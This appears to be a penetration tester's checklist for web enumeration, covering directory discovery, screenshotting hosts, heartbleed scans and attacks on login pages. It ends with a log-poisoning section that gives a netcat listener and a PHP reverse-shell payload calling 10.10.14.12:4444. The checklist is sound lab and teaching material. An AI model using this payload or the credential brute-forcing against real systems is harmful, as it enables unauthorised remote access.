# Enumeration checklist

## Checklist

* [ ] Check what the web proxy
* [ ] Read entire pages. Enumerate for emails, names, user info etc
* [ ] Directory discovery
* [ ] Enum the interface, version of CMS? Server installation page?
* [ ] Potential vulnerability? LFI, RFI, XEE, Upload?
* [ ] Default web server page, version information
* [ ] View source code
* [ ] Hidden Values
* [ ] Developer Remarks
* [ ] Extraneous Code
* [ ] Passwords
* [ ] Robots.txt
* [ ] Web scanning

## Web Scanning

[<mark style="color:orange;">Web Scanning</mark>](https://app.gitbook.com/o/DePFHfBJGf9frqSqhss9/s/8Ph1wRzmHMLajrNtK3qw/\~/changes/16/information-gathering/active-information-gathering/http-s-tcp-80-443-8080-8443/web-scanning)

## Bruteforcing HTTP(s) directories and files

[<mark style="color:orange;">Directory discovery</mark>](https://app.gitbook.com/o/DePFHfBJGf9frqSqhss9/s/8Ph1wRzmHMLajrNtK3qw/\~/changes/16/information-gathering/active-information-gathering/http-s-tcp-80-443-8080-8443/directory-discovery)

## HTTP(s) certificates

**Might have username**

## Script to preview the website from IP in html&#x20;

**Create a list of the IP and Extract PNG**

```
  for ip in $(cat web-ip.txt | grep 80 | grep -v "Nmap" |
awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done
```

&#x20;**Make it HTML pngtohtml.sh**

```
#!/bin/bash
# Bash script to examine the scan results through HTML.
echo "<HTML><BODY><BR>" > web.html
ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600><BR>"}' >> w
eb.html
echo "</BODY></HTML>" >> web.html
```

## Create a wordlist from webpage

* **Cewl**

## Redirecting webpage automatically ?

* **noredirect plugin**

## Login page

* [ ] View source code
* [ ] Use default password
* [ ] Brute force directory first (sometime you don't need to login to pwn the machine)
* [ ] Search credential by bruteforce directory
* [ ] bruteforce credential
* [ ] Search credential in other service port
* [ ] Enumeration for the credential
* [ ] Register first
* [ ] SQL injection
* [ ] XSS can be used to get the admin cookie
* [ ] Bruteforce session cookie

## Identity WAF

* **wafw00f**

## Find version vulnerability

* **Google**

## HTTPS  heartbleed

* **Scan for heartbleed**

```
sslscan $ip:443
nmap -sV --script=ssl-heartbleed $ip
```

## Password ?

When presented with an enter credentials page, the first thing I try is common credentials (admin/admin, admin/password).

If that doesn’t work out, I look for default credentials online that are specific to the technology. Last, I use a password cracker if all else fails.

## Log poisoning

**1 .  From LFI to RCE**

**2 . If you get local file inclusion for log, you maybe can log poisoning the log**

**3 . Change user agent by intercept in burp to this to get reverse shell**

```
nc -lnvp 4444
```

```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f') ?>
```
